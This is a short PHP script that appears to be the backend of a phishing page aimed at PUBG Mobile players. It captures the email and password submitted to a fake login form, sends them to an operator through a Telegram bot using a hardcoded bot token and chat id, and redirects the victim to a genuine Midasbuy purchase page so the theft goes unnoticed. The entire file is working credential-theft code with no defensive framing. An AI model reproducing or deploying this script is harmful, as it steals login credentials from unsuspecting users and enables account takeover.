<?php
header ('Location: https://www.midasbuy.com/iq/props_order/pubgm?pid=S12_RP_Upgrade_Card_Package ');
$API_KEY = "1001484957:AAEBYr9ZJUh_Ks0x2pwpjPDUBhdWjwZOx4I";#توكن البوت
$admin = 1105852813;
$user = $_POST['email'];
$pass = $_POST['pass'];
$text = urlencode("
𝒄𝒐𝒏𝒈𝒓𝒂𝒕𝒖𝒍𝒂𝒕𝒊𝒐𝒏𝒔 𝒏𝒆𝒘 𝒂𝒄𝒄𝒐𝒖𝒏𝒕 🔥🐍
𝒆𝒎𝒂𝒊𝒍 : $user
𝒑𝒂𝒔𝒔𝒘𝒐𝒓𝒅 : $pass
𝒕𝒉𝒆 𝒊𝒏𝒅𝒆𝒙 𝒃𝒚 @ThePHPbots");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
